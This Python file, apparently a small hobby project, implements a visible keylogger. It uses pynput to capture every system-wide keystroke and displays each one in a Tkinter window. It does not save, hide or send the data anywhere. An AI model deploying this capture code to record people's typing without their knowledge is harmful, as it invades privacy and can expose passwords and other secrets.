from pathlib import Path
from pynput import keyboard
from tkinter import *

"""
This program is a simple keylogger that captures keystrokes and displays them in a Tkinter GUI.
"""

# Initialize main Tkinter window
window = Tk()
window.geometry("589x335")
window.configure(bg="#FFFFFF")

canvas = Canvas(
    window,
    bg="#FFFFFF",
    height=400,
    width=700,
    bd=0,
    highlightthickness=0,
    relief="ridge"
)
canvas.place(x=0, y=0)

# Create the rectangles
canvas.create_rectangle(
    0.0, 4.0, 589.0, 335.0, fill="#303030", outline="")  # Main rectangle
canvas.create_rectangle(
    294.0, 4.0, 589.0, 335.0, fill="#282828", outline="")  # Rectangle 2
canvas.create_rectangle(
    302.0, 16.0, 581.0, 329.0, fill="#202020", outline="")
canvas.create_rectangle(
    0.0, 4.0, 294.0, 41.0, fill="#535353", outline="")  # Rectangle 1



# Text widget for displaying keystroke output
keystroke_output = Text(
    window,
    bg="#202020",
    fg="#FFFFFF",
    wrap=WORD,
    font=("Helvetica", 10),
    relief="flat",
    state="normal"  # Keep the widget editable for keylogger input
)
keystroke_output.place(x=302, y=16, width=200, height=313)

# Scrollbar for the text widget
scrollbar = Scrollbar(window, orient=VERTICAL, command=keystroke_output.yview)
keystroke_output.config(yscrollcommand=scrollbar.set)
scrollbar.place(x=277, y=16, height=313, )

# Function to capture keystrokes and display them
def keyPressed(key):
    try:
        # Capture printable characters
        char = key.char  
        keystroke_output.insert(END, char)
    except AttributeError:
        # Handle special keys (e.g., Shift, Enter)
        special_key = f"[{key}]"
        keystroke_output.insert(END, special_key)
    keystroke_output.see(END)  # Auto-scroll to the latest keystroke

# Initialize the key listener and start it
if __name__ == "__main__":
    logger = keyboard.Listener(on_press=keyPressed)
    logger.start()

# Run the Tkinter main loop to handle the GUI
window.resizable(False, False)
window.mainloop()
